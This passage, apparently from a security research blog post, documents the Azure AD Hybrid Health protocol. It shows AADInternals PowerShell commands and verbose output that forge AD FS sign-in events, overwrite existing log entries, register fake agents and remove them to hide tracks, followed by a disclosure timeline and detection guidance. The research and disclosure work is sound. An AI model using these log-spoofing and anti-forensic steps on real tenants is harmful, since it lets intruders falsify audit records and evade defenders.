+<span class="ln">30</span>		<span class="nt">&#34;DeviceID&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
+<span class="ln">31</span>		<span class="nt">&#34;ErrorHitCount&#34;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+<span class="ln">32</span>		<span class="nt">&#34;X509CertificateType&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
+<span class="ln">33</span>		<span class="nt">&#34;MFAAuthenticationType&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
+<span class="ln">34</span>		<span class="nt">&#34;ActivityId&#34;</span><span class="p">:</span> <span class="s2">&#34;b91630ee-984e-40ff-a7ea-ffefdb472048&#34;</span><span class="p">,</span>
+<span class="ln">35</span>		<span class="nt">&#34;ActivityIdAutoGenerated&#34;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+<span class="hl"><span class="ln">36</span>		<span class="nt">&#34;PrimarySid&#34;</span><span class="p">:</span> <span class="s2">&#34;S-1-5-21-2918793985-2280761178-2512057791-1602&#34;</span><span class="p">,</span>
+</span><span class="hl"><span class="ln">37</span>		<span class="nt">&#34;ImmutableId&#34;</span><span class="p">:</span> <span class="s2">&#34;rJcYmpdAz0i3VB7sI6ZDcg==&#34;</span>
+</span><span class="ln">38</span>	<span class="p">}</span>
+<span class="ln">39</span><span class="p">]</span></code></pre></div>
+
+<p><strong>Note:</strong> From the identity information (rows 14, 16, 36, and 37 from the json file above) Azure AD only cares about UPN. All log-in events are sent to Azure AD.
+However, only those events having an UPN of an existing Azure AD user is added to <strong>ADFSSignInLog</strong>.</p>
+
+<p>Before sending the json file, it is compressed using Gzip.</p>
+
+<p>Agent sents the compressed json file to the blob storage by making HTTP POST to the url received in step 5. The url is modified by adding a file name and api-version to it:
+<div class="highlight"><pre class="chroma"><code class="language-xml" data-lang="xml">https://adhsprodweuaadsynciadata.blob.core.windows.net/adfederationservice-<span class="nt">&lt;service_id&gt;</span>/<span class="nt">&lt;id&gt;</span>.json?sv=2018-03-28<span class="err">&amp;</span>sr=c<span class="err">&amp;</span>sig=RCrQOWOLr%2FjHIX6%2FxCti1bPmbHgkp4T9eLS07uP%2FyKM%3D<span class="err">&amp;</span>se=2021-07-10T08%3A01%3A46Z<span class="err">&amp;</span>sp=w<span class="err">&amp;</span>api-version=2017-04-17</code></pre></div>
+<strong>&lt;service_id&gt;</strong> is the same than in the previous steps and <strong>&lt;id&gt;</strong> is a random GUID identifying the sent events.</p>
+
+<p>The following HTTP headers are used:
+<div class="highlight"><pre class="chroma"><code class="language-xml" data-lang="xml">User-Agent: Azure-Storage/8.2.0 (.NET CLR 4.0.30319.42000; Win32NT 10.0.17763.0)
+x-ms-version: 2017-04-17
+Content-MD5: <span class="nt">&lt;MD5Hash&gt;</span>
+x-ms-blob-type: BlockBlob
+x-ms-client-request-id: <span class="nt">&lt;id&gt;</span></code></pre></div>
+<strong>&lt;Md5Hash&gt;</strong> is the MD5 hash calculated from the Gzip compressed json file.
+<strong>&lt;id&gt;</strong> is the same id used above.</p>
+
+<h2 id="step-8-send-signature-to-events-hub">Step 8: Send signature to events hub</h2>
+
+<p>Before calculating the signature to be sent to the events hub, we need to derive the signature key (this is very interesting):</p>
+
+<ol>
+<li>SHA512 hash is calculated from the AgentKey. The AgentKey is a base 64 encoded byte array, but the hash is calculated from the b64 string by converting it to the byte array of ASCII values!</li>
+<li>The resulting (binary) hash is converted to hex string.</li>
+<li>Signing key is a result of converting the hex string to byte array by using base 64 decoding !??!??</li>
+</ol>
+
+<p>The next step is to define the string to be signed:
+<div class="highlight"><pre class="chroma"><code class="language-xml" data-lang="xml"><span class="nt">&lt;tenant_id&gt;</span>,<span class="nt">&lt;service_id&gt;</span>,<span class="nt">&lt;machine_id&gt;</span>,Adfs-UsageMetrics,<span class="nt">&lt;blob_url&gt;</span>,<span class="nt">&lt;date_string&gt;</span></code></pre></div>
+<strong>&lt;tenant_id&gt;</strong>,<strong>&lt;service_id&gt;</strong>,<strong>&lt;machine_id&gt;</strong> are the values from the steps 4 and 5. <strong>&lt;blob_url&gt;</strong> is the url used in the previous step but without query parameters.
+<strong>&lt;date_string&gt;</strong> is the signing time (UTC) in sortable format like:</p>
+
+<pre><code>2021-07-09T10:43:35
+</code></pre>
+
+<p>Signature is calculated by converting the string to a byte array of UNICODE values and by calculating a HMACSHA512 from it using the signing key calculated earlier.
+Finally, the signature is base 64 encoded.</p>
+
+<p>Using the endpoint URL from the step 6. a connection is made to Azure Service Bus. Below is the screenshot from Fiddler showing the actual message containing the string to be signed and the actual signature.</p>
+
+<p><img src="/images/posts/hhealth_09.png" alt="Service Bus Dump" /></p>
+
+<p>After sending the signature, the events are shown in the log in 15 minutes or so (can take much longer too).</p>
+
+<h1 id="spoofing-sign-ins-log-with-aadinternals">Spoofing sign-ins log with AADInternals</h1>
+
+<p><strong>AADInternals v0.5.0</strong> includes the functionality to create fake events using the Hybrid Health Service protocol.</p>
+
+<p>First, we need to get the agent information (requires local administrator rights to AD FS server):</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Get the agent information and save to a variable</span>
+<span class="nv">$agentInfo</span> <span class="p">=</span> <span class="nb">Get-AADIntHybridHealthServiceAgentInfo</span></code></pre></div>
+
+<p>Second, we create an array of fake events. This and the next step can be done from any internet-joined computer using the agent information from the previous step.</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Create an array of fake events</span>
+<span class="nv">$events</span><span class="p">=@(</span>
+    <span class="nb">New-AADIntHybridHealtServiceEvent</span> <span class="n">-Server</span> <span class="nv">$agentInfo</span><span class="p">.</span><span class="n">Server</span> <span class="n">-UPN</span> <span class="s2">&#34;NestorW@contoso.azurelabs.online&#34;</span> <span class="n">-IPAddress</span> <span class="s2">&#34;22.22.22.22&#34;</span> <span class="n">-NetworkLocationType</span> <span class="n">Extranet</span>  <span class="n">-Timestamp</span> <span class="p">(</span><span class="nb">Get-Date</span><span class="p">).</span><span class="n">AddHours</span><span class="p">(-</span><span class="n">1</span><span class="p">)</span>
+    <span class="nb">New-AADIntHybridHealtServiceEvent</span> <span class="n">-Server</span> <span class="nv">$agentInfo</span><span class="p">.</span><span class="n">Server</span> <span class="n">-UPN</span> <span class="s2">&#34;DiegoS@contoso.azurelabs.online&#34;</span>  <span class="n">-IPAddress</span> <span class="s2">&#34;11.11.11.11&#34;</span> <span class="n">-NetworkLocationType</span> <span class="n">Extranet</span> 
+<span class="p">)</span></code></pre></div>
+
+<p>Finally, we&rsquo;ll send the events! I&rsquo;m using -Verbose switch here to see what&rsquo;s going on under-the-hood:</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Send the events</span>
+<span class="nb">Send-AADIntHybridHealthServiceEvents</span> <span class="n">-AgentInfo</span> <span class="nv">$agentInfo</span> <span class="n">-Events</span> <span class="nv">$events</span> <span class="n">-Verbose</span></code></pre></div>
+
+<p><strong>Output:</strong></p>
+
+<pre><code>VERBOSE: POST https://s1.adhybridhealth.azure.com/oauth2/token with -1-byte payload
+VERBOSE: received 443-byte response of content type application/json; charset=UTF-8
+VERBOSE: GET https://s1.adhybridhealth.azure.com/providers/Microsoft.ADHybridHealthService/monitoringpolicies/50abc8f3-243a-4ac1-a3fb-712054d7334b/keys/BlobUploadKey with 0-byte payload
+VERBOSE: received 218-byte response of content type application/json; charset=utf-8
+VERBOSE: GET https://s1.adhybridhealth.azure.com/providers/Microsoft.ADHybridHealthService/monitoringpolicies/50abc8f3-243a-4ac1-a3fb-712054d7334b/keys/EventHubPublisherKey with 0-byte payload
+VERBOSE: received 411-byte response of content type application/json; charset=utf-8
+VERBOSE: Get-CompressedByteArray
+VERBOSE: PUT https://adhsprodweuaadsynciadata.blob.core.windows.net/adfederationservice-50abc8f3-243a-4ac1-a3fb-712054d7334b/a653012f-522a-4d47-b4b5-a753ccebd353.json?sv=2018-03-28&amp;sr=c&amp;sig=cwyvMgry1h5IyfA3hQwKX1%2FoOPibv1lvZq7fbPSwF4U%3D&amp;se=2021-07-10T12:16:57Z&amp;sp=w&amp;api-version=2017-04-17 with -1-byte payload
+VERBOSE: received 0-byte response of content type 
+VERBOSE: Opening websocket: wss://adhsprodweuehadfsia.servicebus.windows.net/$servicebus/websocket
+VERBOSE: IN: @{Type=Protocol SASL; Protocol=3; Major=1; Minor=0; Revision=0}
+VERBOSE: OUT:@{Type=Protocol SASL; Protocol=3; Major=1; Minor=0; Revision=0}
+VERBOSE: IN: @{Type=Protocol SASL; Protocol=3; Major=1; Minor=0; Revision=0}
+VERBOSE: IN: @{Size=63; DOFF=2; Extended Header=System.Object[]; Type=SASL Mechanisms; Content=System.Object[]}
+VERBOSE: IN: @{Size=26; DOFF=2; Extended Header=System.Object[]}
+VERBOSE: OUT:@{Size=26; DOFF=2; Extended Header=System.Object[]}
+VERBOSE: IN: @{Size=26; DOFF=2; Extended Header=System.Object[]; Type=SASL Outcome; Status=ok; Message=Welcome!}
+VERBOSE: IN: @{Type=Protocol AMQP; Protocol=0; Major=1; Minor=0; Revision=0}
+VERBOSE: OUT:@{Type=Protocol AMQP; Protocol=0; Major=1; Minor=0; Revision=0}
+VERBOSE: IN: @{Type=Protocol AMQP; Protocol=0; Major=1; Minor=0; Revision=0}
+VERBOSE: IN: @{Size=106; DOFF=2; Extended Header=System.Object[]; Type=AQMP Open; Channel=0; ContainerId=ed0739c1de7a6d907f304916220bea5b; HostName=adhsprodweuehadfsia.servicebus.windows.net; MaxFrameSize=65536; ChannelMax=8191; IdleTimeOut=; OutgoingLocales=; IncomingLocales=; OfferedCapabilities=; DesiredCapabilities=; Properties=}
+VERBOSE: OUT:@{Size=106; DOFF=2; Extended Header=System.Object[]; Type=AQMP Open; Channel=0; ContainerId=ed0739c1de7a6d907f304916220bea5b; HostName=adhsprodweuehadfsia.servicebus.windows.net; MaxFrameSize=65536; ChannelMax=8191; IdleTimeOut=; OutgoingLocales=; IncomingLocales=; OfferedCapabilities=; DesiredCapabilities=; Properties=}
+VERBOSE: IN: @{Size=71; DOFF=2; Extended Header=System.Object[]; Type=AQMP Open; Channel=0; ContainerId=31e228ec82a74f9cbd981e4b535a974b_G22; HostName=; MaxFrameSize=65536; ChannelMax=4999; IdleTimeOut=120000; OutgoingLocales=; IncomingLocales=; OfferedCapabilities=; DesiredCapabilities=; Properties=}
+VERBOSE: IN: @{Size=35; DOFF=2; Extended Header=System.Object[]; Type=AQMP Begin; Channel=0; RemoteChannel=; NextOutgoingId=1; IncomingWindow=5000; OutgoingWindow=5000; HandleMax=262143; OfferedCapabilities=; DesiredCapabilities=; Properties=}
+VERBOSE: OUT:@{Size=35; DOFF=2; Extended Header=System.Object[]; Type=AQMP Begin; Channel=0; RemoteChannel=; NextOutgoingId=1; IncomingWindow=5000; OutgoingWindow=5000; HandleMax=262143; OfferedCapabilities=; DesiredCapabilities=; Properties=}
+VERBOSE: IN: @{Size=34; DOFF=2; Extended Header=System.Object[]; Type=AQMP Begin; Channel=0; RemoteChannel=0; NextOutgoingId=1; IncomingWindow=5000; OutgoingWindow=5000; HandleMax=255; OfferedCapabilities=; DesiredCapabilities=; Properties=}
+VERBOSE: IN: @{Size=124; DOFF=2; Extended Header=System.Object[]; Type=AQMP Attach; Channel=0; Name=duplex64193:64195:64196:sender; Handle=0; Direction=out; Target=$cbs; TrackingId=69968}
+VERBOSE: OUT:@{Size=124; DOFF=2; Extended Header=System.Object[]; Type=AQMP Attach; Channel=0; Name=duplex64193:64195:64196:sender; Handle=0; Direction=out; Target=$cbs; TrackingId=69968}
+VERBOSE: IN: @{Size=132; DOFF=2; Extended Header=System.Object[]; Type=AQMP Attach; Channel=0; Name=duplex64193:64195:64196:sender; Handle=0; Direction=in; Target=@ ; TrackingId=69968}
+VERBOSE: IN: @{Size=36; DOFF=2; Extended Header=System.Object[]; Type=AQMP Flow; Channel=0; NextIncomingId=1; IncomingWindow=5000; NextOutgoingId=1; OutgoingWindow=5000; Handle=0; DeliveryCount=0; LinkCredit=100; Available=0; Drain=; Echo=False; Properties=}
+VERBOSE: IN: @{Size=159; DOFF=2; Extended Header=System.Object[]; Type=AQMP Attach; Channel=0; Name=duplex64193:64195:64196:receiver; Handle=1; Direction=in; Target=$cbs; TrackingId=69968}
+VERBOSE: OUT:@{Size=159; DOFF=2; Extended Header=System.Object[]; Type=AQMP Attach; Channel=0; Name=duplex64193:64195:64196:receiver; Handle=1; Direction=in; Target=$cbs; TrackingId=69968}
+VERBOSE: IN: @{Size=167; DOFF=2; Extended Header=System.Object[]; Type=AQMP Attach; Channel=0; Name=duplex64193:64195:64196:receiver; Handle=1; Direction=out; Target=ed0739c1de7a6d907f304916220bea5b; TrackingId=69968}
+VERBOSE: IN: @{Size=37; DOFF=2; Extended Header=System.Object[]; Type=AQMP Flow; Channel=0; NextIncomingId=1; IncomingWindow=5000; NextOutgoingId=1; OutgoingWindow=5000; Handle=1; DeliveryCount=0; LinkCredit=50; Available=0; Drain=; Echo=False; Properties=}
+VERBOSE: OUT:@{Size=37; DOFF=2; Extended Header=System.Object[]; Type=AQMP Flow; Channel=0; NextIncomingId=1; IncomingWindow=5000; NextOutgoingId=1; OutgoingWindow=5000; Handle=1; DeliveryCount=0; LinkCredit=50; Available=0; Drain=; Echo=False; Properties=}
+VERBOSE: IN: @{Size=556; DOFF=2; Extended Header=System.Object[]; Type=AQMP Transfer; Channel=0; Handle=0; DeliveryId=0; DeliveryTag=Qw==; MessageFormat=0; Settled=True; More=False; RcvSettleMode=; State=; Resume=; Aborted=; Batchable=False}
+VERBOSE: OUT:@{Size=556; DOFF=2; Extended Header=System.Object[]; Type=AQMP Transfer; Channel=0; Handle=0; DeliveryId=0; DeliveryTag=Qw==; MessageFormat=0; Settled=True; More=False; RcvSettleMode=; State=; Resume=; Aborted=; Batchable=False}
+VERBOSE: IN: @{Size=113; DOFF=2; Extended Header=System.Object[]; Type=AQMP Transfer; Channel=0; Handle=1; DeliveryId=0; DeliveryTag=AQAAAEM=; MessageFormat=0; Settled=True; More=False; RcvSettleMode=; State=; Resume=; Aborted=; Batchable=False}
+VERBOSE: IN: @{Size=266; DOFF=2; Extended Header=System.Object[]; Type=AQMP Attach; Channel=0; Name=479fb98dc6864904aade7b577963e835;64193:64194:64199; Handle=2; Direction=out; Target=adhsprodweuehadfsia/Publishers/66543d53-b49b-483b-9312-b8c5fdfea30c; TrackingId=7}
+VERBOSE: OUT:@{Size=266; DOFF=2; Extended Header=System.Object[]; Type=AQMP Attach; Channel=0; Name=479fb98dc6864904aade7b577963e835;64193:64194:64199; Handle=2; Direction=out; Target=adhsprodweuehadfsia/Publishers/66543d53-b49b-483b-9312-b8c5fdfea30c; TrackingId=7}
+VERBOSE: IN: @{Size=5469120; DOFF=23; Extended Header=System.Object[]}
+VERBOSE: IN: @{Size=580; DOFF=2; Extended Header=System.Object[]; Type=AQMP Transfer; Channel=0; Handle=2; DeliveryId=0; DeliveryTag=AQAAAEM=; MessageFormat=0; Settled=; More=False; RcvSettleMode=; State=; Resume=; Aborted=; Batchable=True}
+VERBOSE: OUT:@{Size=580; DOFF=2; Extended Header=System.Object[]; Type=AQMP Transfer; Channel=0; Handle=2; DeliveryId=0; DeliveryTag=AQAAAEM=; MessageFormat=0; Settled=; More=False; RcvSettleMode=; State=; Resume=; Aborted=; Batchable=True}
+VERBOSE: IN: @{Size=17; DOFF=2; Extended Header=System.Object[]; Type=AQMP Detach; Channel=0; Handle=0; Closed=True; Error=}
+VERBOSE: OUT:@{Size=17; DOFF=2; Extended Header=System.Object[]; Type=AQMP Detach; Channel=0; Handle=0; Closed=True; Error=}
+VERBOSE: IN: @{Size=18; DOFF=2; Extended Header=System.Object[]; Type=AQMP Detach; Channel=0; Handle=1; Closed=True; Error=}
+VERBOSE: OUT:@{Size=18; DOFF=2; Extended Header=System.Object[]; Type=AQMP Detach; Channel=0; Handle=1; Closed=True; Error=}
+VERBOSE: IN: @{Size=18; DOFF=2; Extended Header=System.Object[]; Type=AQMP Detach; Channel=0; Handle=2; Closed=True; Error=}
+VERBOSE: OUT:@{Size=18; DOFF=2; Extended Header=System.Object[]; Type=AQMP Detach; Channel=0; Handle=2; Closed=True; Error=}
+VERBOSE: IN: @{Size=15; DOFF=2; Extended Header=System.Object[]; Type=AQMP End; Channel=0; Error=}
+VERBOSE: OUT:@{Size=15; DOFF=2; Extended Header=System.Object[]; Type=AQMP End; Channel=0; Error=}
+VERBOSE: Closing websocket
+</code></pre>
+
+<p>After 15 min or so, the events appear in the <strong>sign-ins (interactive)</strong> log. And as we can see, we were able to alter also the sign-ins time:</p>
+
+<p><img src="/images/posts/hhealth_10.png" alt="Fake events" /></p>
+
+<h1 id="tampering-with-sign-ins-log">Tampering with sign-ins log</h1>
+
+<p>Studying the protocol and the information sent to Azure AD, I noticed that the <strong>Request ID</strong> in the sign-ins is equal to the <strong>UniqueID</strong> of the event.
+<img src="/images/posts/hhealth_16.png" alt="UniqueID &amp; Request Id" /></p>
+
+<p>This made me wonder what happens if I use an existing <strong>Request ID</strong> as <strong>UniqueID</strong> for the events:
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Create an event using existing Request ID as UniqueID</span>
+<span class="nv">$events</span><span class="p">=@(</span>
+    <span class="nb">New-AADIntHybridHealtServiceEvent</span> <span class="n">-UniqueID</span> <span class="s2">&#34;8d62c873-3d82-48f9-a30b-532be551709c&#34;</span> <span class="n">-Server</span> <span class="nv">$agentInfo</span><span class="p">.</span><span class="n">Server</span> <span class="n">-UPN</span> <span class="s2">&#34;NestorW@contoso.azurelabs.online&#34;</span> <span class="n">-IPAddress</span> <span class="s2">&#34;22.22.22.22&#34;</span> <span class="n">-NetworkLocationType</span> <span class="n">Extranet</span>
+<span class="p">)</span></code></pre></div></p>
+
+<p>It turned out that <strong>the fake event overwrote the existing event!</strong> This allowed threat actors to hide their log-in activities by replacing their log-ins with arbitrary information.</p>
+
+<p><strong>Timeline:</strong></p>
+
+<table>
+<thead>
+<tr>
+<th>Date</th>
+<th>Activity</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>May 30th 2021</td>
+<td>Discovery of the vulnerability</td>
+</tr>
+
+<tr>
+<td>May 31st 2021</td>
+<td>Reported the vulnerability to Microsoft</td>
+</tr>
+
+<tr>
+<td>Jun  6th 2021</td>
+<td>Shared tool with Microsoft to reproduce the issue</td>
+</tr>
+
+<tr>
+<td>Jun 16th 2021</td>
+<td>Microsoft confirmed the behaviour and indicated reviewing the report for a bounty award</td>
+</tr>
+
+<tr>
+<td>Jul  2nd 2021</td>
+<td>Microsoft awarded bounty of 10000 USD (Severity: Important, Security Impact: Spoofing)</td>
+</tr>
+
+<tr>
+<td>Jul  2nd 2021</td>
+<td>Disagreed with the severity and impact - spoofing is spoofing and tampering is tampering..</td>
+</tr>
+
+<tr>
+<td>Jul  6th 2021</td>
+<td>Microsoft reported that a fix had been applied</td>
+</tr>
+
+<tr>
+<td>Jul  7th 2021</td>
+<td>Confirmed the fix adressed the issue: <br><br>Now all events will get a randomly generated <strong>Request ID</strong> so the tampering is not possible anymore.</td>
+</tr>
+</tbody>
+</table>
+
+<h1 id="registering-fake-agents-with-aadinternals-v0-5-0-and-later">Registering fake agents with AADInternals v0.5.0 and later</h1>
+
+<p>Creating fake log-in events using an existing agent requires local administrator access to the server where the agent is installed. With <strong>Global Administrator</strong> permissions, this can also be done remotely,
+as fake agents can be registered from any computer with internet connect - even for tenants which do not have AD FS.</p>
+
+<p><strong>Note:</strong> For some reason, the <strong>registration events are not logged to the audit log</strong>, making it very easy to hide your tracks!</p>
+
+<h2 id="registering-hybrid-health-service">Registering hybrid health service</h2>
+
+<p>First, we need to create a new hybrid health service:</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Get an access token and save it to the cache:</span>
+<span class="nb">Get-AADIntAccessTokenForAzureCoreManagement</span> <span class="n">-SaveToCache</span>
+
+<span class="c"># Create a new AD FS service</span>
+<span class="nb">New-AADIntHybridHealthService</span> <span class="n">-DisplayName</span> <span class="s2">&#34;sts.company.com&#34;</span> <span class="n">-Signature</span> <span class="s2">&#34;sts.company.com&#34;</span> <span class="n">-Type</span> <span class="n">AdFederationService</span></code></pre></div>
+
+<pre><code>activeAlerts                             : 0
+additionalInformation                    : 
+createdDate                              : 2021-07-12T07:25:29.1009287Z
+customNotificationEmails                 : 
+disabled                                 : False
+displayName                              : sts.company.com
+health                                   : Healthy
+lastDisabled                             : 
+lastUpdated                              : 0001-01-01T00:00:00
+monitoringConfigurationsComputed         : 
+monitoringConfigurationsCustomized       : 
+notificationEmailEnabled                 : True
+notificationEmailEnabledForGlobalAdmins  : True
+notificationEmails                       : 
+notificationEmailsEnabledForGlobalAdmins : False
+resolvedAlerts                           : 0
+serviceId                                : 189c61bb-2c9c-4e86-b038-d0257c6c559e
+serviceMembers                           : 
+serviceName                              : AdFederationService-sts.company.com
+signature                                : sts.company.com
+simpleProperties                         : 
+tenantId                                 : c5ff949d-2696-4b68-9e13-055f19ed2d51
+type                                     : AdFederationService
+originalDisabledState                    : False
+</code></pre>
+
+<p>The new service will now appear in the list of AD FS services:</p>
+
+<p><img src="/images/posts/hhealth_12.png" alt="New service" /></p>
+
+<p>As we can see, the status of the service is currently <strong>Unmonitored</strong>. This is because we have not registered any service members yet.</p>
+
+<h2 id="registering-ad-fs-server">Registering AD FS server</h2>
+
+<p>Let&rsquo;s next register a new AD FS server:</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># List the service names</span>
+<span class="nb">Get-AADIntHybridHealthServices</span> <span class="n">-Service</span> <span class="n">AdFederationService</span> <span class="p">|</span> <span class="n">ft</span> <span class="n">serviceName</span></code></pre></div>
+
+<pre><code>serviceName                             
+-----------                             
+AdFederationService-sts.company.com     
+AdFederationService-sts.fake.myo365.site
+</code></pre>
+
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Register a new AD FS server</span>
+<span class="nb">Register-AADIntHybridHealthServiceAgent</span> <span class="n">-ServiceName</span> <span class="s2">&#34;AdFederationService-sts.company.com&#34;</span> <span class="n">-MachineName</span> <span class="s2">&#34;ADFS01&#34;</span> <span class="n">-MachineRole</span> <span class="n">AdfsServer_2016</span></code></pre></div>
+
+<pre><code>Agent info saved to         &quot;AdFederationService-sts.company.com_c5ff949d-2696-4b68-9e13-055f19ed2d51_224a18a0-b450-477c-a437-07916855e570_ADFS01.json&quot;
+Client sertificate saved to &quot;AdFederationService-sts.company.com_c5ff949d-2696-4b68-9e13-055f19ed2d51_224a18a0-b450-477c-a437-07916855e570_ADFS01.pfx&quot;
+</code></pre>
+
+<p>Agent information (AgentKey etc.) is saved to a .json file and the agent&rsquo;s certificate to a .pfx file (empty password).</p>
+
+<p>Now the service status has changed to <strong>Healthy</strong>:
+<img src="/images/posts/hhealth_15.png" alt="New service - status healthy" /></p>
+
+<p>Clicking the service will show the details of the service and we can see there is one registered AD FS server:
+<img src="/images/posts/hhealth_13.png" alt="New service - status healthy" /></p>
+
+<p>Clicking anywhere in the Overview box will show the list of all registered agents:
+<img src="/images/posts/hhealth_14.png" alt="New service - status healthy" /></p>
+
+<p>Multiple servers and proxies can be registered with the same process.</p>
+
+<h2 id="creating-fake-events">Creating fake events</h2>
+
+<p>Now we can create fake events same way we did <a href="#spoofing-sign-ins-log-with-aadinternals">above</a>:</p>
+
+<p>Now we can load the agent information to a variable and create fake events as <a href="#spoofing-sign-in-log-with-aadinternals">above</a>:</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Load the agent information and save to a variable</span>
+<span class="nv">$agentInfo</span> <span class="p">=</span> <span class="nb">Get-Content</span> <span class="s2">&#34;AdFederationService-sts.company.com_c5ff949d-2696-4b68-9e13-055f19ed2d51_224a18a0-b450-477c-a437-07916855e570_ADFS01.json&#34;</span> <span class="p">|</span> <span class="nb">ConvertFrom-Json</span>
+
+<span class="c"># Send the events</span>
+<span class="nb">Send-AADIntHybridHealthServiceEvents</span> <span class="n">-AgentInfo</span> <span class="nv">$agentInfo</span> <span class="n">-Events</span> <span class="nv">$events</span> <span class="n">-Verbose</span></code></pre></div>
+
+<h2 id="removing-fake-services-and-agents">Removing fake services and agents</h2>
+
+<p>Finally, to hide your tracks, you can remove the service and agents:
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Remove the service and agents</span>
+<span class="nb">Remove-AADIntHybridHealthService</span> <span class="n">-ServiceName</span> <span class="s2">&#34;AdFederationService-sts.company.com&#34;</span></code></pre></div></p>
+
+<p><strong>Note:</strong> I was able to create AD FS service and register agents also to the tenant without Azure Premium P1 or P2 subscription. However, the events won&rsquo;t appear in the Azure AD sign-ins log and service
+can&rsquo;t be viewed from the Azure Portal.</p>
+
+<h1 id="how-to-detect">How to detect</h1>
+
+<h2 id="exporting-agent-secrets">Exporting agent secrets</h2>
+
+<p>After original publication of this blog, <a href="https://twitter.com/Cyb3rWard0g" target="_blank">@Cyb3rWard0g</a> created <a href="https://github.com/SigmaHQ/sigma/pull/1934" target="_blank">Sigma</a>
+and <a href="https://github.com/search?q=repo%3AAzure%2FAzure-Sentinel+extension%3Ayaml+filename%3AAADHybridHealthADFSNewServer.yaml+filename%3AAADHybridHealthADFSServiceDelete.yaml+filename%3AAADHybridHealthADFSSuspApp.yaml+filename%3AAADHealthMonAgentRegKeyAccess.yaml+filename%3AAADHealthSvcAgentRegKeyAccess.yaml&type=Code&ref=advsearch&l=&l=" target="_blank">Azure Sentinel</a> rules for detecting access to agent key.</p>
+
+<h2 id="spoofing">Spoofing</h2>
+
+<p>This kind of activity, where you communicate with the cloud directly, is often hard to detect. In this case, with the information available at <strong>ADFSSignInLog</strong>, exploitation can&rsquo;t be detected at all.</p>
+
+<h2 id="registering-fake-services">Registering fake services</h2>
+
+<p>As mentioned earlier, <strong>registration events are not logged to the audit log</strong>. However, the events are included in the <strong>Directory Activity log</strong> of any <strong>Azure subscription</strong> of the tenant:</p>
+
+<p><img src="/images/posts/hhealth_17.png" alt="Azure Directory Activity log" /></p>
+
+<p>How about the tenants without Azure subscription? Don&rsquo;t worry, I got you covered as <strong>AADInternals v0.6.0</strong> includes a function to view the Azure Directory Activity log items!</p>
+
+<p><strong>Note:</strong> If the tenant doesn&rsquo;t have Azure subscription, the user must have &ldquo;Access management for Azure resources&rdquo; switched on at <a href="https://portal.azure.com/#blade/Microsoft_AAD_IAM/ActiveDirectoryMenuBlade/Properties" target="_blank">Azure AD properties</a>
+ or use <strong>AADInternals</strong> <a href="/aadinternals/#grant-aadintazureuseraccessadminrole-ac">Grant-AADIntAzureUserAccessAdminRole</a> function to switch it on.</p>
+
+<p><img src="/images/posts/hhealth_18.png" alt="Azure AD properties" /></p>
+
+<p>To get the Azure Directory Activity events use the following commands:</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Get the access token and save to cache</span>
+<span class="nb">Get-AADIntAccessTokenForAzureCoreManagement</span> <span class="n">-SaveToCache</span>
+
+<span class="c"># Optional: grant Azure User Access Administrator role (and wait for about 10 seconds for changes to take effect)</span>
+<span class="n">Grant-AADIntAzureUserAccessAdminRole</span>
+
+<span class="c"># Get the events for the last month</span>
+<span class="nv">$events</span> <span class="p">=</span> <span class="nb">Get-AADIntAzureDirectoryActivityLog</span> <span class="n">-Start</span> <span class="p">(</span><span class="nb">Get-Date</span><span class="p">).</span><span class="n">AddDays</span><span class="p">(-</span><span class="n">31</span><span class="p">)</span>
+
+<span class="c"># Select ADHybridHealthService related events and extract relevant information</span>
+<span class="nv">$events</span> <span class="p">|</span> <span class="n">where</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">authorization</span><span class="p">.</span><span class="n">action</span> <span class="o">-like</span> <span class="s2">&#34;Microsoft.ADHybrid*&#34;</span><span class="p">}</span> <span class="p">|</span> <span class="p">%{</span><span class="nb">New-Object</span> <span class="n">psobject</span> <span class="n">-Property</span> <span class="p">(</span><span class="no">[ordered]</span><span class="p">@{</span><span class="s2">&#34;Scope&#34;</span><span class="p">=</span><span class="nv">$_</span><span class="p">.</span><span class="n">authorization</span><span class="p">.</span><span class="n">scope</span><span class="p">;</span><span class="s2">&#34;Operation&#34;</span><span class="p">=</span><span class="nv">$_</span><span class="p">.</span><span class="n">operationName</span><span class="p">.</span><span class="n">localizedValue</span><span class="p">;</span><span class="s2">&#34;Caller&#34;</span><span class="p">=</span><span class="nv">$_</span><span class="p">.</span><span class="n">caller</span><span class="p">;</span><span class="s2">&#34;TimeStamp&#34;</span><span class="p">=</span><span class="nv">$_</span><span class="p">.</span><span class="n">eventTimeStamp</span><span class="p">;</span><span class="s2">&#34;IpAddress&#34;</span><span class="p">=</span><span class="nv">$_</span><span class="p">.</span><span class="n">httpRequest</span><span class="p">.</span><span class="n">clientIpAddress</span><span class="p">})}</span> <span class="p">|</span> <span class="n">ft</span></code></pre></div>
+
+<p><strong>Output:</strong>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">Scope                                                                                    Operation          Caller                               TimeStamp IpAddress                  
+-----                                                                                    ---------          ------                               --------- ---------         
+<span class="hl">/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts2.company.com Creates a server.  admin@company.com 2021-08-25T15:10:59.0148112Z 51.65.246.212
